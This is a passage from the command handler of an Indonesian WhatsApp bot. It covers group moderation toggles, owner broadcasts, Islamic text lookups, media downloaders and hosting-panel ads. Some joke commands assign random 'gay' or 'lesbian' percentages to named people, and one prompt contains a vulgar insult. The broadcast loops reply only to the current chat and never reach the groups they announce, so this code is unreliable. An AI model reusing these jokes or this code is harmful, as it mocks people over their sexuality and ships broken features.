                    newReply(`Antilink Group WhatsApp Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilink) return newReply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilink = false
                    newReply(`Antilink Group WhatsApp Nonaktif 🕊️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            case 'antilinkv2':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args.length < 1) return newReply(`Example ${prefix + command} on/off`)
                if (q == 'on'){
                    global.db.data.chats[m.chat].antilinkv2 = true
                    newReply(`Berhasil Mengaktifkan antilinkv2`)
                } else if (q == 'off'){
                    global.db.data.chats[m.chat].antilinkv2 = false
                    newReply(`Berhasil Mematikan antilinkv2`)
                }
            break
            case 'antilinkyt': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilinkyt) return newReply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilinkyt = true
                    newReply(`Antilink YouTube Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilinkyt) return newReply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilinkyt = false
                    newReply(`Antilink YouTube Nonaktif 🕊️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            case 'antilinktt': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilinktt) return newReply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilinktt = true
                    newReply(`Antilink TikTok Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilinktt) return newReply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilinktt = false
                    newReply(`Antilink TikTok Nonaktif 🕊️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            case 'antipanel': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antipanel) return newReply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antipanel = true
                    newReply(`Anti Promosi Panel Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antipanel) return newReply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antipanel = false
                    newReply(`Anti Promosi Panel Nonaktif 🕊️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            case 'mutegc': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].mute) return newReply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].mute = true
                    newReply(`Bot telah di mute di group ini 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].mute) return newReply(`Sudah Tidak Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].mute = false
                    newReply(`Bot telah di unmute di group ini 🕊️`)
                } else {
                   newReply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === '1') {
                    await conn.groupToggleEphemeral(m.chat, 1*24*3600).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === '7') {
                    await conn.groupToggleEphemeral(m.chat, 7*24*3600).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === '90') {
                    await conn.groupToggleEphemeral(m.chat, 90*24*3600).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'off') {
                    await conn.groupToggleEphemeral(m.chat, 0).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else {
                let sections = [
                {
                title: "CHANGE EFFECTIVE GROUP",
                rows: [
                {title: "⌲ Ephemeral 1 day", rowId: `ephemeral 1`, description: `Activate the ephemeral group for 1 day`},
                {title: "⌲ Ephemeral 7 day's", rowId: `ephemeral 7`, description: `Activate the ephemeral group for 7 day's`},
                {title: "⌲ Ephemeral 90 days's", rowId: `ephemeral 90`, description: `Activate the ephemeral group for 90 day's`},
                {title: "⌲ Ephemeral Off", rowId: `ephemeral off`, description: `Deactivate this Ephemeral group`}
                ]
                },
                ]
                conn.sendListMsg(m.chat, `Please select the following Ephemeral Options List !`, ntiktok, `Hello Admin ${groupMetadata.subject}`, `Touch Me (⁠≧⁠▽⁠≦⁠)`, sections, m)
                }
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) return newReply(mess.owner)
                if (!text) return `Text mana?\n\nContoh : ${prefix + command} Hu Tao ><`
                let getGroups = await conn.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                newReply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                    newReply(txt)
                }
                newReply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) return newReply(mess.owner)
                if (!text) return `Text mana?\n\nContoh : ${prefix + command} Hu Tao ><`
                let anu = await store.chats.all().map(v => v.id)
                newReply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		    for (let yoi of anu) {
		            await sleep(1500)
		            let txt = `「 Broadcast Bot 」\n\n${text}`
                    newReply(txt)
                }
		    newReply('Sukses Broadcast')
            }
            break
            case 'group':
            case 'grup': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                if (args[0] === 'close') {
                    await conn.groupSettingUpdate(m.chat, 'announcement').then((res) => newReply(`Sukses Menutup Group 🕊️`)).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'open') {
                    await conn.groupSettingUpdate(m.chat, 'not_announcement').then((res) => newReply(`Sukses Membuka Group 🕊️`)).catch((err) => newReply(jsonformat(err)))
                } else {
                  newReply(`Mode ${command}\n\n\nKetik ${prefix + command}open/close`)
                }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === 'open') {
                    await conn.groupSettingUpdate(m.chat, 'unlocked').then((res) => newReply(`Sukses Membuka Edit Info Group 🕊️`)).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'close') {
                    await conn.groupSettingUpdate(m.chat, 'locked').then((res) => newReply(`Sukses Menutup Edit Info Group 🕊️`)).catch((err) => newReply(jsonformat(err)))
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            case 'linkgroup':
            case 'linkgrup':
            case 'linkgc': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                let response = await conn.groupInviteCode(m.chat)
                conn.sendText(m.chat, `👥 *INFO LINK GROUP*\n📛 *Nama :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Tidak diketahui'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Link Chat :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m,  {
                    detectLink: true
                })
            }
            break
            case 'revoke': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                await conn.groupRevokeInvite(m.chat)
                    .then(res => {
                        newReply(`Sukses Menyetel Ulang, Tautan Undangan Grup ${groupMetadata.subject}`)
                    }).catch((err) => newReply(jsonformat(err)))
                    }
            break
            case 'listonline':
            case 'liston': {
                if (!m.isGroup) newReply(mess.group)
                let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                let online = [...Object.keys(store.presences[id]), botNumber]
                conn.sendText(m.chat, '⏰ List Online:\n\n' + online.map(v => '🌱 @' + v.replace(/@.+/, '')).join`\n`, m, {
                    mentions: online
                })
            }
            break
        // Fun Fitur 
        
            case 'apakah': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
                const kah = apa[Math.floor(Math.random() * apa.length)]
                newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
                }
                break
            case 'bisakah': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
                const ga = bisa[Math.floor(Math.random() * bisa.length)]
                newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
                }
                break
            case 'bagaimanakah': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Yang Sabar Ya Bos:(', 'Gimana yeee']
                const ya = gimana[Math.floor(Math.random() * gimana.length)]
                newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
                }
            break
            case 'rate': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
                const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const te = ra[Math.floor(Math.random() * ra.length)]
                newReply(`Rate : ${q}\nJawaban : *${te}%*`)
                }
            break
            
            case 'gantengcek':
            case 'cekganteng': {
                if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
                const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
                const teng = gan[Math.floor(Math.random() * gan.length)]
                newReply(`Nama : ${q}\nJawaban : *${teng}%`)
                }
            break
                
            case 'cantikcek':
            case 'cekcantik': {
                if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Akame`)
                const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
                const tik = can[Math.floor(Math.random() * can.length)]
                newReply(`Nama : ${q}\nJawaban : *${tik}%`)
                }
            break
            
            case 'sangecek':
            case 'ceksange':
            case 'gaycek':
            case 'cekgay':
            case 'lesbicek':
            case 'ceklesbi': {
                if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
                const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
                newReply(`Nama : ${q}\nJawaban : *${sange}%*`)
                }
            break
                
            case 'kapankah': {
                if (!q) return newReply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
                const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
                const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
                newReply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
                }
            break
            
            case 'wangy': {
                if (!q) return newReply(`Contoh : .wangy Riy`)
                qq = q.toUpperCase()
                awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
                newReply(awikwok)
                }
            break
            
            case 'cekmati': {
                if (!q) return newReply(`Invalid!\n\nYg mau di cek siapa kontol?`)
                predea = await axios.get(`https://api.agify.io/?name=${q}`)
                newReply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
                }
            break
            
            case 'halah':
            case 'hilih':
            case 'huluh':
            case 'heleh':
            case 'holoh': {
                if (!m.quoted && !text) return newReply(`Kirim/reply text dengan caption ${prefix + command}`)
                ter = command[1].toLowerCase()
                tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
                newReply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
                }
            break
            
        // ISLAMIN FITUR
            case 'iqra': {
                oh = `Contoh : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
                if (!text) return newReply(oh)
                yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
                conn.sendMessage(m.chat, {
                    document: yy,
                    mimetype: 'application/pdf',
                    fileName: `iqra${text}.pdf`
                }, {
                    quoted: m
                }).catch((err) => newReply(oh))
            }
            break
            case 'juzamma': {
                if (args[0] === 'pdf') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'
                        },
                        mimetype: 'application/pdf',
                        fileName: 'juz-amma-arab-latin-indonesia.pdf'
                    }, {
                        quoted: m
                    })
                } else if (args[0] === 'docx') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'
                        },
                        mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                        fileName: 'juz-amma-arab-latin-indonesia.docx'
                    }, {
                        quoted: m
                    })
                } else if (args[0] === 'pptx') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'
                        },
                        mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                        fileName: 'juz-amma-arab-latin-indonesia.pptx'
                    }, {
                        quoted: m
                    })
                } else if (args[0] === 'xlsx') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'
                        },
                        mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                        fileName: 'juz-amma-arab-latin-indonesia.xlsx'
                    }, {
                        quoted: m
                    })
                } else {
                    newReply(`Mau format apa ? Contoh : ${prefix + command} pdf\nFormat yang tersedia : pdf, docx, pptx, xlsx`)
                }
            }
            break
            case 'hadis':
            case 'hadist': {
                if (!args[0]) return newReply(`Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`)
                if (!args[1]) return `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
                try {
                    let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
                    let {
                        number,
                        arab,
                        id
                    } = res.find(v => v.number == args[1])
                    newReply(`No. ${number}

${arab}

${id}`)
                } catch (e) {
                    newReply(`Hadis tidak ditemukan !`)
                }
            }
            break
            case 'tafsirsurah': {
                if (!args[0]) return `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
                if (!args[1]) return `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
                let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
                let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
                newReply(txt)
            }
            break
            // Islami Fitur
            case 'asmaulhusna':
            newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${apikey}`)
				.then(({ data }) => {
					var text = `No : ${data.result.index}\n`
					text += `Latin: ${data.result.latin}\n`
					text += `Arab : ${data.result.ar}\n`
					text += `Indonesia : ${data.result.id}\n`
					text += `English : ${data.result.en}`
					newReply(text)
				})
				.catch(console.error)
			break
			
			case 'alquranaudio': {
                if (args.length == 0) return newReply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
                newReply(mess.wait)
                conn.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${args[0]}?apikey=${apikey}`}, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
            }
            break
            
            case 'alquran':
			if (args.length < 1) return newReply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
			newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${apikey}`)
				.then(({ data }) => {
					var ayat = data.result.ayat
					var text = `QS. ${data.result.surah} : 1-${ayat.length}\n\n`
					for (var x of ayat) {
						text += `${x.arab}\n${x.ayat}. ${x.latin}\n${x.indonesia}\n\n`
					}
					text = text.replace(/<u>/g, '_').replace(/<\/u>/g, '_')
					text = text.replace(/<strong>/g, '*').replace(/<\/strong>/g, '*')
					newReply(text)
				})
				.catch(console.error)
            break
            
			case 'jadwalsolat': {
            if (!text) return newReply('Mana Kotanya?')
            newReply(mess.wait)
            let anu = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${text}?apikey=${apikey}`)
            newReply(`Wilayah: ${anu.result.wilayah}\n\nTanggal: ${anu.result.tanggal}\nSahur: ${anu.result.sahur}\nImsak: ${anu.result.imsak}\nTerbit: ${anu.result.terbit}\nDhuha: ${anu.result.dhuha}\nDzuhur: ${anu.result.dzuhur}\nAshar: ${anu.result.ashar}\nMagrib: ${anu.result.maghrib}\nIsya: ${anu.result.isya}`)
            }
            break
            
            case 'kisahnabi':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Muhammad`)
			newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/kisahnabi/${full_args}?apikey=${apikey}`)
				.then(({ data }) => {
					var text = `Name : ${data.result.name}\n`
					text += `Lahir : ${data.result.thn_kelahiran}\n`
					text += `Umur : ${data.result.age}\n`
					text += `Tempat : ${data.result.place}\n`
					text += `Story : \n${data.result.story}`
					newReply(text)
				})
				.catch(console.error)
			break
			
            case 'listsurah':
            newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/quran?apikey=${apikey}`)
				.then(({ data }) => {
					var text = 'List Surah:\n'
					for (var x in data.result) {
						text += `${x}. ${data.result[x]}\n`
					}
					newReply(text)
				})
				.catch(console.error)
			break
			
			// DOWNLOADER FITUR
			case 'git': case 'gitclone':
                if (!args[0]) return newReply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/OxBrutal/HuTod`)
                if (!isUrl(args[0]) && !args[0].includes('github.com')) return newReply(`Link invalid!!`)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
                let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
                let [, user, repo] = args[0].match(regex1) || []
                repo = repo.replace(/.git$/, '')
                let url = `https://api.github.com/repos/${user}/${repo}/zipball`
                let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
                conn.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => newReply(mess.error))
            .catch(console.error)
            break
			
			case "listpanel": {
newReply("乂 𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔 𝗣𝗔𝗡𝗘𝗟 乂\n\n📮RAM 1GB CPU 30% 3K/BULAN\n📮RAM 2GB CPU 50% 5K/BULAN\n📮RAM 3GB CPU 70% 8K/BULAN\n📮RAM 4GB CPU 90% 10K/BULAN\n📮RAM 5GB CPU 110% 12K/BULAN\n\n📮RAM - CPU UNLIMITED 15K/BULAN\n\n🍁– FRESH\n🍁– ANTI DELAY\n🍁– GA BOROS KUOTA\n🍁– GA MENUHIN MEMORI\n🍁– BISA BUAT RUN BOT NO RIBET\n🍁– WEBSITE CLOSE BOT TETAP ON\n\n🔰「 BUY PANEL BOT 」\nhttps://wa.me/6288210828960")
}
break

case "listsewa": {
newReply("乂 *SEWA BOT* 乂\n🛑 *1 BULAN = 10K*\n\n🔰「 𝙲𝙷𝙰𝚃 」\nhttps://wa.me/6288210828960")
}
break
			
			case 'play':
			case 'ytplay':
			if (args.length == 0) return await newReply(`Example: ${prefix + command} melukis senja`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
			newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${full_args}`)
				.then(({ data }) => {
					axios.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=https://www.youtube.com/watch?v=${data.result[0].videoId}`).then(({ data }) => {
						var caption = `❖ Title   : *${data.result.title}*\n`
						caption += `❖ Size   : *${data.result.size}*`
						conn.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption }).then(() => {
							conn.sendMessage(m.chat, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
						})
					})
				})
				.catch(console.error)
			break
			
			case 'ytmp3':
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://youtu.be/dOycbiwwVo0`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
			newReply(mess.wait)
			axios
				.get(`https://api.ibeng.tech/api/download/ytmp3?url=${args[0]}&apikey=${ibeng}`)
				.then(({ data }) => {
					var caption = `❖ Title    : *${data.result.title}*\n`
					caption += `❖ Views     : *${data.result.views}*\n`
					caption += `❖ Publish     : *${data.result.published}*`
					conn.sendMessage(m.chat, { image: { url: data.result.thumb }, caption }).then(() => {
						conn.sendMessage(m.chat, { audio: { url: data.result.url }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp4` })
					})
				})
				.catch(console.error)
			break
			
		    case 'ytmp4':
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://youtu.be/dOycbiwwVo0`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
			newReply(mess.wait)
			axios
				.get(`https://api.ibeng.tech/api/download/ytmp4?url=${args[0]}&apikey=${ibeng}`)
				.then(({ data }) => {
					var caption = `❖ Title    : *${data.result.title}*\n`
					caption += `❖ Views     : *${data.result.views}*\n`
					caption += `❖ Publish     : *${data.result.published}*`
					conn.sendMessage(m.chat, { image: { url: data.result.thumb }, caption }).then(() => {
						conn.sendMessage(m.chat, { video: { url: data.result.url }, mimetype: 'video/mp4', fileName: `${data.result.title}.mp4` })
					})
				})
				.catch(console.error)
			break

			case 'igdl':
			if (args.length == 0) return newReply(`Example: ${prefix + command} link lu`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				var url = data.result[0]
				if (url.includes('.mp4')) {
					conn.sendMessage(m.chat, { video: { url }, mimetype: 'video/mp4' })
				} else {
					conn.sendMessage(m.chat, { image: { url } })
				}
			})
			
            .catch(console.error)
			break
			
		    case 'igdl2':
			if (args.length == 0) return newReply(`Example: ${prefix + command} link lu`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/instagram2?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				for (var x of data.result.media) {
					if (x.includes('.mp4')) {
						conn.sendMessage(m.chat, { video: { url: x }, mimetype: 'video/mp4' })
					} else {
						conn.sendMessage(m.chat, { image: { url: x } })
					}
				}
			})
			
			.catch(console.error)
			break
			
			case 'mediafire': {
	if (args.length == 0) return newReply(`Mana Link Nya ?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw `The link you provided is invalid`
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 50) return newReply('😅 Waduh Filenya Terlalu Besar...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
newReply(`${result4}`)
conn.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break

			case 'tiktok':
